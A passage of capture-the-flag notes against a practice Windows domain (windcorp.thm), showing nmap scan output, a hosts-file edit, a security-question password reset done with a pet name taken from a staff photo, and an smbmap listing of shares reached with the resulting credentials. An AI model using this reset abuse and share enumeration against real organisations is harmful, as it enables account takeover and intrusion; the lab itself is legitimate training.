|     HTTP/1.1 200 OK
|     Date: Fri, 11 Nov 2022 04:58:13 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Nov 2022 04:58:21 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp  open  ssl/xmltec-xmlmail? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Nov 2022 04:58:35 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 11 Nov 2022 04:58:36 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf              syn-ack .NET Message Framing
49670/tcp open  msrpc               syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc               syn-ack Microsoft Windows RPC
49676/tcp open  msrpc               syn-ack Microsoft Windows RPC
49744/tcp open  msrpc               syn-ack Microsoft Windows RPC
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.93%I=7%D=11/10%Time=636DD675%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/
SF:streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-strea
SF:ms\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5223-TCP:V=7.93%T=SSL%I=7%D=11/10%Time=636DD688%P=x86_64-pc-linux-g
SF:nu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber
SF:\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp
SF:-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.93%I=7%D=11/10%Time=636DD675%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/
SF:streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-strea
SF:ms\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5263-TCP:V=7.93%T=SSL%I=7%D=11/10%Time=636DD689%P=x86_64-pc-linux-g
SF:nu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber
SF:\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp
SF:-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.93%I=7%D=11/10%Time=636DD676%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/
SF:streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-strea
SF:ms\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5276-TCP:V=7.93%T=SSL%I=7%D=11/10%Time=636DD689%P=x86_64-pc-linux-g
SF:nu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber
SF:\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp
SF:-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.93%I=7%D=11/10%Time=636DD666%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2011\x20Nov\x20
SF:2022\x2004:58:13\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\
SF:x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<m
SF:eta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>
SF:\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ille
SF:gal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-
SF:8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\
SF:x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0<
SF:/pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,
SF:C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illeg
SF:al\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x
SF:20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
SF:Content-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
SF:\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\
SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20characte
SF:r\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTP
SF:Options,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2011\x20Nov\x20202
SF:2\x2004:58:21\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.93%T=SSL%I=7%D=11/10%Time=636DD67C%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2011\x20N
SF:ov\x202022\x2004:58:35\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2
SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges
SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></titl
SF:e>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n<
SF:/head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x202
SF:00\x20OK\r\nDate:\x20Fri,\x2011\x20Nov\x202022\x2004:58:36\x20GMT\r\nAl
SF:low:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20
SF:400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-885
SF:9-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20
SF:Message\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCChec
SF:k,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x2040
SF:0\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;cha
SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
SF:n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20
SF:CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x
SF:20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33667/tcp): CLEAN (Timeout)
|   Check 2 (port 33793/tcp): CLEAN (Timeout)
|   Check 3 (port 60016/udp): CLEAN (Timeout)
|   Check 4 (port 56669/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-11T04:59:21
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.71 seconds


after looking the src code
                                                                                          
┌──(kali㉿kali)-[~/ra]
└─$ sudo nano /etc/hosts          
[sudo] password for kali: 

10.10.181.243 windcorp.thm
10.10.181.243 fire.windcorp.thm
                                  

  <img class="img-fluid rounded-circle mb-3" src="img/lilyleAndSparky.jpg" alt="">
            <h5>Lily Levesque</h5>
            <p class="font-weight-light mb-0">"I love being able to bring my best friend to work with me!"</p>

reset pass: lilyle      What's ur favorite pets name     Sparky


Your password has been reset to: ChangeMe#1234
Remember to change it after logging in! 

using credentials

┌──(kali㉿kali)-[~/ra]
└─$ smbmap -u lilyle -p ChangeMe#1234 -R -H windcorp.thm
[+] IP: windcorp.thm:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                5 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-250-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2bc-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-538-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-718-0
        fr--r--r--                7 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-348-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-348-1
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\49674
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    8a634c244ca1face
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\593
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-980-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    winreg
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    netdfs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-334-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.133126162206096162.4032.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-d04-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    TermSrv_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    Ctx_WinStation_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    SessEnvPublicRpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-16b8-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iisipm86a6c3fa-54db-4a55-ab79-492d723a120a
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iislogpipe846400ce-25bd-4dec-83eb-42209dec5f1e
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.133126163389626214.6280.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-cb0-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.133126162194246019.3640.DefaultAppDomain.sme
        NETLOGON                                                READ ONLY       Logon server share 
        .\NETLOGON\*
        dr--r--r--                0 Sat May  2 06:02:19 2020    .
        dr--r--r--                0 Sat May  2 06:02:19 2020    ..
        Shared                                                  READ ONLY
        .\Shared\*
        dr--r--r--                0 Fri May 29 20:45:42 2020    .
        dr--r--r--                0 Fri May 29 20:45:42 2020    ..
        fr--r--r--               45 Fri May  1 11:32:36 2020    Flag 1.txt
        fr--r--r--         29526628 Fri May 29 20:45:01 2020    spark_2_8_3.deb
        fr--r--r--         99555201 Sun May  3 07:08:39 2020    spark_2_8_3.dmg
        fr--r--r--         78765568 Sun May  3 07:08:39 2020    spark_2_8_3.exe
        fr--r--r--        123216290 Sun May  3 07:08:39 2020    spark_2_8_3.tar.gz
        SYSVOL                                                  READ ONLY       Logon server share 
        .\SYSVOL\*
        dr--r--r--                0 Sat May  2 06:02:20 2020    .
        dr--r--r--                0 Sat May  2 06:02:20 2020    ..
        dr--r--r--                0 Sat May  2 06:02:20 2020    NRznLVEcPj
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    windcorp.thm
        .\SYSVOL\windcorp.thm\*
        dr--r--r--                0 Thu Apr 30 11:17:20 2020    .
        dr--r--r--                0 Thu Apr 30 11:17:20 2020    ..
        dr--r--r--                0 Fri Nov 11 00:02:07 2022    DfsrPrivate
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    Policies
        dr--r--r--                0 Sat May  2 06:02:19 2020    scripts
        .\SYSVOL\windcorp.thm\Policies\*
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    .
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    ..
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    .
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    ..
        fr--r--r--               23 Fri May  8 09:15:01 2020    GPT.INI
        dr--r--r--                0 Fri May  1 07:32:28 2020    MACHINE
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    USER
        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Thu May  7 03:34:46 2020    .
        dr--r--r--                0 Thu May  7 03:34:46 2020    ..
        dr--r--r--                0 Thu May  7 03:34:46 2020    Applications
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    Microsoft
        fr--r--r--             2792 Thu Apr 30 11:18:05 2020    Registry.pol
        dr--r--r--                0 Fri May  1 07:32:28 2020    Scripts
        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    .
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    ..
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    Windows NT
        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\*
        dr--r--r--                0 Fri May  1 07:32:28 2020    .
        dr--r--r--                0 Fri May  1 07:32:28 2020    ..
        dr--r--r--                0 Fri May  1 07:32:28 2020    Shutdown
        dr--r--r--                0 Fri May  1 07:32:28 2020    Startup
        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    .
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    ..
        fr--r--r--               23 Thu May  7 03:34:35 2020    GPT.INI
        dr--r--r--                0 Fri May  1 05:55:05 2020    MACHINE
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    USER
        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Fri May  1 05:55:05 2020    .
        dr--r--r--                0 Fri May  1 05:55:05 2020    ..
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    Microsoft
        dr--r--r--                0 Fri May  1 05:55:05 2020    Scripts
        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    .
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    ..
        dr--r--r--                0 Thu Apr 30 11:11:10 2020    Windows NT
        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\*
        dr--r--r--                0 Fri May  1 05:55:05 2020    .
        dr--r--r--                0 Fri May  1 05:55:05 2020    ..
        dr--r--r--                0 Fri May  1 05:55:05 2020    Shutdown
        dr--r--r--                0 Fri May  1 05:55:05 2020    Startup
        Users                                                   READ ONLY
        .\Users\*
        dw--w--w--                0 Sat May  2 18:05:58 2020    .
        dw--w--w--                0 Sat May  2 18:05:58 2020    ..
        dr--r--r--                0 Sun May 10 07:18:11 2020    Administrator
        dr--r--r--                0 Thu Apr 30 20:33:55 2020    All Users
        dr--r--r--                0 Fri May  1 09:09:44 2020    angrybird
        dr--r--r--                0 Fri May  1 09:09:34 2020    berg
        dr--r--r--                0 Fri May  1 09:09:22 2020    bluefrog579
        dr--r--r--                0 Sun May  3 09:30:02 2020    brittanycr
        dr--r--r--                0 Fri May  1 09:09:08 2020    brownostrich284
        dr--r--r--                0 Thu Nov 10 23:59:41 2022    buse
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    Default
        dr--r--r--                0 Thu Apr 30 20:33:55 2020    Default User
        fr--r--r--              174 Thu Apr 30 20:31:55 2020    desktop.ini
        dr--r--r--                0 Fri May  1 09:08:54 2020    edward
        dr--r--r--                0 Sat May  2 19:30:16 2020    freddy
        dr--r--r--                0 Fri May  1 09:08:28 2020    garys
        dr--r--r--                0 Fri Nov 11 00:01:10 2022    goldencat416
        dr--r--r--                0 Fri May  1 09:08:17 2020    goldenwol
        dr--r--r--                0 Fri May  1 09:08:06 2020    happ
        dr--r--r--                0 Fri May  1 09:07:53 2020    happyme
        dr--r--r--                0 Fri May  1 09:07:42 2020    Luis
        dr--r--r--                0 Fri May  1 09:07:31 2020    orga
        dr--r--r--                0 Fri May  1 09:07:19 2020    organicf
        dr--r--r--                0 Fri Nov 11 00:02:04 2022    organicfish718
        dr--r--r--                0 Fri May  1 09:07:06 2020    pete
        dw--w--w--                0 Thu Apr 30 10:35:47 2020    Public
        dr--r--r--                0 Fri May  1 09:06:54 2020    purplecat
        dr--r--r--                0 Fri May  1 09:06:42 2020    purplepanda
        dr--r--r--                0 Fri May  1 09:06:31 2020    sadswan
        dr--r--r--                0 Fri Nov 11 00:05:23 2022    sadswan869
        dr--r--r--                0 Fri May  1 09:06:20 2020    sheela
        dr--r--r--                0 Fri May  1 09:05:39 2020    silver
        dr--r--r--                0 Fri May  1 09:05:24 2020    smallf
        dr--r--r--                0 Fri May  1 09:05:05 2020    spiff
        dr--r--r--                0 Fri May  1 09:04:49 2020    tinygoos
        dr--r--r--                0 Fri May  1 09:03:57 2020    whiteleopard
        .\Users\Default\*
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    .
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    ..
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    AppData
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Application Data
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Cookies
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Desktop
        dw--w--w--                0 Thu Apr 30 19:35:11 2020    Documents
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Downloads
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Favorites
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Links
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Local Settings
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Music
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    My Documents
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    NetHood
        fr--r--r--           262144 Thu Apr 30 20:33:04 2020    NTUSER.DAT
        fr--r--r--            57344 Thu Apr 30 20:33:04 2020    NTUSER.DAT.LOG1
        fr--r--r--                0 Thu Apr 30 20:33:35 2020    NTUSER.DAT.LOG2
        fr--r--r--            65536 Thu Apr 30 19:35:11 2020    NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
        fr--r--r--           524288 Thu Apr 30 19:35:11 2020    NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
        fr--r--r--           524288 Thu Apr 30 19:35:11 2020    NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
        dw--w--w--                0 Thu Apr 30 20:33:35 2020    Pictures
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    PrintHood
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Recent
        dr--r--r--                0 Thu Apr 30 20:33:35 2020    Saved Games
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    SendTo
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Start Menu
        dr--r--r--                0 Thu Apr 30 19:35:11 2020    Templates
